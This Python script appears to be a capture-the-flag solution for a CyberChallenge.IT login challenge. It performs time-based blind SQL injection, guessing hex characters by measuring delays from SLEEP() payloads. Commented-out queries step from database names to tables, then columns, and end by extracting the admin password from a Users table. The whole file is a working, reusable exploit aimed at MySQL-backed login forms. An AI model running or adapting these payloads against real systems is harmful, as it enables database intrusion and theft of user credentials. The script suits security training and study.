import requests, time
from typing import Callable
__all__ = 'linear_time_search'.split()



def linear_time_search(send_request: Callable, d_time: float, value=''):

  # convert starting_value in hexadecimal form
  value = ''.join([hex(ord(i))[2:] for i in value])

  timer = time.time()

  while True:
    for l in '0123456789abcdef':
      t = time.time()
      send_request(value+l)
      t = time.time() - t
      if t > d_time*.95:
        value += l
        print(value)
        break
    else:
      break
      
  timer = time.time() - timer
  print("linear execution time:", timer)
  print(bytes.fromhex(value))
  return bytes.fromhex(value).decode()
  



if __name__ == '__main__':

  # db
  # QUERY = "' AND (SELECT SLEEP({}) FROM information_schema.schemata WHERE HEX(schema_name) LIKE '{}%') -- "
  # table
  # QUERY = "' AND (SELECT SLEEP({}) FROM information_schema.tables WHERE HEX(table_name) LIKE '{}%' AND table_schema = DATABASE()) -- "
  # column
  # QUERY = "' AND (SELECT SLEEP({}) FROM information_schema.columns WHERE HEX(column_name) LIKE '{}%' AND table_name = 'Users') -- "
  # value
  # QUERY = "' AND (SELECT SLEEP({}) FROM Users WHERE HEX(pwd) LIKE '{}%' AND isAdmin=1) -- "
  QUERY = ""
  TIME = .8


  def send_request(value:str):
    url = "http://onbusinessdev.challs.cyberchallenge.it:80/login.php"
    cookies = {"OBDEV_SESSID": "594e7f4c495e7bbedc9a166d7555c1f6"}
    headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://onbusinessdev.challs.cyberchallenge.it", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://onbusinessdev.challs.cyberchallenge.it/login.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
    data = {
      "email": QUERY.format(TIME, value),
      "password": "1"
    }
    requests.post(url, headers=headers, cookies=cookies, data=data)


  print(linear_time_search(send_request, TIME))